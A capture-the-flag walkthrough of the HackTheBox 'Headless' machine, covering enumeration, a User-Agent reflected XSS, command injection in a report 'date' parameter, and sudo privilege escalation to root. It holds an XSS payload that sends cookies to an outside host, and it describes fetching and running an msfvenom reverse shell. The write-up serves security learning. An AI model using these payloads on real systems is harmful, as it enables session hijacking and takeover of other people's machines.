---
date: 2025-04-15
categories: [CTF, HTB]
title: "HTB - Headless"
tags: ['linux', 'nmap', 'privilege escalation', 'python', 'rce', 'reverse shell', 'xss', 'tryhackme', 'hackthebox', 'immersivelabs', 'thm', 'iml', 'htb']

description: "Headless - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Headless

NMAP

![image1](../resources/3c80bf65f98a417abdc9de767bdd5732.png)
 
Go to port 5000 in a browser - we can see it uses cookies:

![image2](../resources/4e972bba1701417b9e40e5a5c10f90ef.png)

- HttpOnly is set to **false**
Which means we can steal the cookies of other users

- Look for directories:

`dirsearch -u http://10.129.35.58:5000 /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt`



![image3](../resources/e288c54c60f64c48a19faae614f9aa4d.png)

- On the /support page:

![image4](../resources/75486423603540d39e9dafcc21025dbd.png)

- If we try and enter XSS code, we get this:

![image5](../resources/2c7e860e909e4aeb9bfcf45baf6699e3.png)

- Now looking at the error message, we see that our **User-Agent** information is being reflected

- Open Burp and forward to Repeater

- In order to get Reflected XSS we need to inject the XSS into the User-Agent field and get the page to error like before

- We need to set up a python server to catch the GET request which should have an (admin) cookie attached to it

- Using the payload:

```java
<img src=x onerror=fetch('http://10.10.14.23/?c='+document.cookie);>

```
and entering **hello;\<script\>** in the **message field** so that it errors. (Anything inside \<\> tags makes this page error)


![image6](../resources/b5f36784cc374c59afec29484a5e3d13.png)


![image7](../resources/6dc6a636156e4161a6e30a89e8050121.png)

- Got the cookie:  
is_admin= **ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0**

- Good article here:  
<https://systemweakness.com/reflected-xss-user-agent-2868ca1d5116>

- In the browser, Inspect -\> Storage -\> Cookies
- Change the cookie to the admin cookie

- Go to **/dashboard**


![image8](../resources/ac636b9d7709446f9c4a952e2b0379d1.png)

- Click on generate report and catch the request in Burp and send to Repeater:

![image9](../resources/a6c75ba552064d938d2077f2420780e4.png)


![image10](../resources/3d9119b0bfcb43c18e73d9fb2f435333.png)

- As we can see, the **date** parameter gets passed to the server as an argument

- We can inject commands into this parameter using **;**

![image11](../resources/b560fe1f3729472f939a6c1ef1b9f66f.png)

- The reverse shells didn't want to work

- But curl works:

![image12](../resources/2fd912ea3ad64fa88e83960dcac9d95d.png)

- Create a msfvenom linux .elf file and curl it onto the victim machine
- Run chmod +x on the reverse.elf file
- Set up msfconsole listener
- Run ./reverse.elf

- Got shell:

![image13](../resources/fd46e7feca16442691a127fef71146ce.png)


![image14](../resources/6e40cc79e04c467982668c5599edd89c.png)

```bash
cat user.txt

```
Upload public key to the ~/.ssh/authorized_keys and use SSH

```bash
sudo -l

```

![image15](../resources/731f0fa0989e430f997db6af215494cd.png)


![image16](../resources/3684b736a51447f0ba573b7bc3144c37.png)

- Checking the file /usr/bin/syscheck:

![image17](../resources/3d2d3f7ac3a74f41ba360d2fb04d97c7.png)

- In dvir home, create the file ./initdb.sh:

![image18](../resources/c092a50183f342d0a8f51c8493cee43e.png)

```bash
chmod +x initdb.sh
sudo /usr/bin/syscheck

```
- We have root:

![image19](../resources/974cddeac4af44649913cae2c9375fbf.png)